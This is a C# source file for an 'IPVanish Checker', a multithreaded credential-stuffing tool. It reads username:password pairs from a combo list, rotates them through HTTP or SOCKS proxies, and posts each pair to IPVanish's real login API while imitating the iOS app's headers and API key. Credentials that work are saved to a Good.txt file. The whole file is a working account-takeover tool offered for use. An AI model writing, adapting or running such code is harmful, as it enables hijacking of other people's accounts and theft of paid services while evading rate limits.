using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Net;
using System.Text;
using ThreadGun;

namespace IPVanish_Checker
{
    class Program
    {

        static List<string> Combo = new List<string>();
        static List<string> Proxy = new List<string>();
        static int Bad;
        static int Good;
        static int Error;
        static int Custom;
        static int Threads;
        static int Checked;
        static int Remaining;
        static string ResultTime;

        public enum Type
        {
            Http,
            Socks4,
            Socks5
        }
        static Type TypeProxy = Type.Http;

        static void Main(string[] args)
        {
            Console.Title = "IPVanish Checker By Ariaei";
            run();
            Console.ReadKey();
        }

        static void run()
        {
            fd();
            static void fd()
            {
                Console.WriteLine(@"
                 ____   +             _______  +               
          /\    |  __ \| |    / \    | ______|| |                
         /  \   | |__) | |   /   \   | |_____ | |                  
        / /\ \  |  _  /| |  / / \ \  | ______|| |                  
       / ____ \ | | \ \| | /  ___  \ | |_____ | |                  
      /_/    \_\|_|  \_\_|/_/     \_\|_______||_|                
                                                                             
");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("1-Brute\n2-Setting\n\n@Ariaei_co");
                int St = Convert.ToInt32(Console.ReadLine());
                if (St == 2)
                {
                    Console.Clear();
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine(@"
                 ____   +             _______  +               
          /\    |  __ \| |    / \    | ______|| |                
         /  \   | |__) | |   /   \   | |_____ | |                  
        / /\ \  |  _  /| |  / / \ \  | ______|| |                  
       / ____ \ | | \ \| | /  ___  \ | |_____ | |                  
      /_/    \_\|_|  \_\_|/_/     \_\|_______||_|                
                                                                             
");
                    Comb();
                    APP();
                    typp();
                    threadd();
                    static void APP()
                    {
                        Console.WriteLine("\nSelect Proxy Load Type:(API Or TXT)");
                        string Ap = Console.ReadLine().ToUpper();
                        if (Ap.Equals("API"))
                        {
                            AP();
                        }
                        else if (Ap.Equals("TXT"))
                        {
                            prox();
                        }
                        else
                        {
                            Console.WriteLine("Please Choose Correct.");
                            APP();
                        }
                    }
                    static void typp()
                    {
                        Console.WriteLine("\nSelect Proxy Type:(Http Or Socks4 Or Socks5)");
                        string Typ = Console.ReadLine().ToUpper();
                        if (Typ.Equals("HTTP"))
                        {
                            TypeProxy = Type.Http;
                        }
                        else if (Typ.Equals("SOCKS4"))
                        {
                            TypeProxy = Type.Socks4;
                        }
                        else if (Typ.Equals("SOCKS5"))
                        {
                            TypeProxy = Type.Socks5;
                        }
                        else
                        {
                            Console.WriteLine("Please Select Correct Type.");
                            typp();
                        }
                    }
                    static void threadd()
                    {
                        Console.WriteLine("\nEnter Thread:(1 - 500)");
                        Threads = Convert.ToInt32(Console.ReadLine());
                        if (Threads >= 1 && Threads <= 500)
                        {
                            Console.Clear();
                            fd();
                        }
                        else
                        {
                            Console.WriteLine("Please Enter Correct Thread.");
                            threadd();
                        }
                    }
                }
                else if(St == 1)
                {
                    if(Combo.Count != 0 && Proxy.Count != 0)
                    {
                        Start();
                    }
                    else
                    {
                        Console.WriteLine("First Set Option!");
                        Thread.Sleep(1000);
                        Console.Clear();
                        Console.ForegroundColor = ConsoleColor.White;
                        fd();
                    }
                }
                else
                {
                    Console.WriteLine("Please Enter Valid Number!");
                    Thread.Sleep(1000);
                    Console.Clear();
                    Console.ForegroundColor = ConsoleColor.White;
                    fd();
                }
            }
        }

        static void Config(string line)
        {
            var User = line.Split(':')[0];
            var Pass = line.Split(':')[1];
            First:
            try
            {
                int p = new Random().Next(Proxy.Count);
                CookieStorage cook = new CookieStorage();
                HttpRequest web = new HttpRequest();
                switch (TypeProxy)
                {
                    case Type.Http:
                        web.Proxy = HttpProxyClient.Parse(Proxy[p]);
                        break;
                    case Type.Socks4:
                        web.Proxy = Socks4ProxyClient.Parse(Proxy[p]);
                        break;
                    case Type.Socks5:
                        web.Proxy = Socks5ProxyClient.Parse(Proxy[p]);
                        break;
                }
                web.AddHeader(HttpHeader.Accept, "*/*");
                web.AddHeader("X-Client-Version", "3.7.1_54307");
                web.AddHeader("X-Platform-Version", "12_5_1");
                web.AddHeader(HttpHeader.AcceptLanguage, "en-us");
                web.UserAgent = "IPVanishVPN/54307 CFNetwork/978.0.7 Darwin/18.7.0";
                web.AddHeader("X-Platform", "iOS");
                web.AddHeader("X-Client", "IPVanishVPN");
                web.AllowAutoRedirect = true;
                web.UseCookies = true;
                web.IgnoreProtocolErrors = true;
                web.Cookies = cook;
                web.KeepAlive = true;
                var Data = web.Post("https://api.ipvanish.com/api/v3/login", Encoding.ASCII.GetBytes("{\"username\":\" " + User + " \",\"password\":\" " + Pass + " \",\"os\":\"iOS_12_5_1\",\"api_key\":\"185f600f32cee535b0bef41ad77c1acd\",\"client\":\"IPVanishVPN_iOS_3.7.1_54307\",\"uuid\":\"2FE088DA - 948F - 4EFA - BF6D - 72E584B6B109\"}"), "application/json");
                if (Data.ToString().Contains("{\"email\":\""))
                {
                    Good++;
                    Checked++;
                    Remaining = Combo.Count - Checked;
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"Good: {Good} | Bad: {Bad} | Custom: {Custom} | Checked: {Checked} | Remaining: {Remaining} | Error : {Error}");
                    StreamWriter sw = new StreamWriter("Checked in " + $"{ResultTime}\\Good.txt", true);
                    sw.WriteLine("===========================Details===========================\nUsername:" + User + "\nPassword:" + Pass + "\n===========================End===========================");
                    sw.Close();
                }
                else if (Data.ToString().Contains("incorrect") || Data.ToString().Contains("The username or password provided is incorrect"))
                {
                    Bad++;
                    Checked++;
                    Remaining = Combo.Count - Checked;
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"Good: {Good} | Bad: {Bad} | Custom: {Custom} | Checked: {Checked} | Remaining: {Remaining} | Error : {Error}");
                    StreamWriter sw = new StreamWriter("Checked in " + $"{ResultTime}\\Bad.txt", true);
                    sw.WriteLine($"{User}:{Pass}");
                    sw.Close();
                }
                else if (Data.ToString().Contains("\"account_type\":3"))
                {
                    Custom++;
                    Checked++;
                    Remaining = Combo.Count - Checked;
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine($"Good: {Good} | Bad: {Bad} | Custom: {Custom} | Checked: {Checked} | Remaining: {Remaining} | Error : {Error}");
                    StreamWriter sw = new StreamWriter("Checked in " + $"{ResultTime}\\Custom.txt", true);
                    sw.WriteLine($"{User}:{Pass}");
                    sw.Close();
                }
                else
                {
                    Error++;
                    Thread.Sleep(2000);
                    goto First;
                }
                web.Dispose();
            }
            catch
            {
                Error++;
                Thread.Sleep(2000);
                goto First;
                //Console.ForegroundColor = ConsoleColor.White;
                //Console.WriteLine($"Good: {Good} | Bad: {Bad} | Custom: {Custom} | Checked: {Checked} | Remaining: {Remaining} | Error : {Error}");
            }
        }

        static void Start()
        {
            try
            {
                ResultTime = $"{DateTime.Now.ToString($"{0:yyyy-MM-dd}" + "---" + $"{0:HH-mm-ss}")}";
                Directory.CreateDirectory("Checked in " + $"{ResultTime}");
                Console.Clear();
                new ThreadGun<string>(Config, Combo, Threads, Thr_Completed, null).FillingMagazine().Start();
            }
            catch
            {
                Directory.Delete("Checked in " + $"{ResultTime}");
                Console.WriteLine("Error to Start.");
            }
        }

        static void Thr_Completed(IEnumerable<string> inputs)
        {
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine("\n\nIPVanish Check Was Completed.");
        }

        static void Comb()
        {
            try
            {
                Combo.Clear();
                StreamReader sr = new StreamReader("Combo.txt");
                while (!sr.EndOfStream)
                {
                    try
                    {
                        string txt = sr.ReadLine();
                        char[] Spl = { ':' };
                        string[] Comb = txt.Split(Spl);
                        Combo.Add(Comb[0] + ':' + Comb[1]);
                    }
                    catch
                    {

                    }
                }
                sr.Close();
                Console.WriteLine($"{Combo.Count} Combo Loaded.");
            }
            catch
            {
                Console.WriteLine("Error To Load Combo.");
            }
        }

        static void prox()
        {
            try
            {
                Proxy.Clear();
                StreamReader sr = new StreamReader("Proxy.txt");
                while (!sr.EndOfStream)
                {
                    try
                    {
                        string txt = sr.ReadLine();
                        char[] Spl = { ':' };
                        string[] Prox = txt.Split(Spl);
                        Proxy.Add(Prox[0] + ':' + Prox[1]);
                    }
                    catch
                    {

                    }
                }
                sr.Close();
                Console.WriteLine($"{Proxy.Count} Proxy Loaded.");
            }
            catch
            {
                Console.WriteLine("Error To Load Proxy.");
            }
        }

        static void AP()
        {
            try
            {
                Console.WriteLine("\nEnter Proxy API:");
                string APIA = Console.ReadLine();
                HttpRequest http = new HttpRequest();
                var result = http.Get(APIA).ToString();
                var Final = result.Split('\n');
                Proxy.Clear();
                Proxy.AddRange(Final);
                Console.WriteLine($"{Proxy.Count} Proxy Loaded From API.");
            }
            catch
            {
                Console.WriteLine("Its Wrong, Enter Valid Proxy API");
                AP();
            }
        }
    }
}
